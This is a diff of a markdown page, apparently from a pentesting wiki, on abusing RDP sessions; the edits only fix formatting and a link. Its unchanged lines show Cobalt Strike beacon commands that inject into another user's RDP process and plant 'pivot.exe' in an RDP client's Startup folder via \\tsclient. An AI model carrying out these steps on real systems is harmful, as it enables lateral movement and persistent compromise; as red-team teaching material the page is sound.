@@ -1,6 +1,5 @@
 # RDP Sessions Abuse
 
-
 ## RDP Process Injection
 
 If the **external group** has **RDP access** to any **computer** in the current domain, an **attacker** could **compromise that computer and wait for him**.
@@ -30,8 +29,8 @@ beacon> ps
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-```
-Check **other ways to steal sessions with other tools** [[../../network-services-pentesting/pentesting-rdp.md#session-stealing|**in this page.**]]
+
+Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
@@ -70,7 +69,4 @@ beacon> ls \\tsclient\c
 beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 beacon> upload C:\Payloads\pivot.exe
 ```
-```
-
-
 
